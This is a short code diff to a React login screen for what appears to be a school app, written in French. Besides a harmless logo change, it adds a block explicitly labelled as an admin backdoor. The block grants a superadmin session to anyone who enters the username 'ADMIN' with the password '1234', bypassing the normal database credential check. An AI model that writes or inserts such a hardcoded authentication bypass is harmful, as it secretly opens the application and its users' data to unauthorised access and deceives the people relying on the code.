@@ -49,6 +49,13 @@ const EcranConnexion = ({ onLogin }) => {
     setErreur('');
     setChargement(true);
 
+    // --- PORTE DÉROBÉE ADMIN ---
+    if (id.toUpperCase() === 'ADMIN' && mdp === '1234') {
+      onLogin({ id: 'superadmin', identifiant: 'ADMIN', role: 'admin' });
+      return;
+    }
+    // ---------------------------
+
     try {
       const q = collection(db, 'artifacts', appId, 'public', 'data', 'utilisateurs');
       const snapshot = await getDocs(q);
@@ -77,7 +84,7 @@ const EcranConnexion = ({ onLogin }) => {
         {/* LOGO DE L'ÉCOLE */}
         <div className="w-20 h-20 mx-auto mb-4 flex items-center justify-center">
           <img 
-            src="/logo.png" 
+            src={LOGO_URL} 
             alt="Logo Cours Tom Morel" 
             className="w-full h-full object-contain"
           />
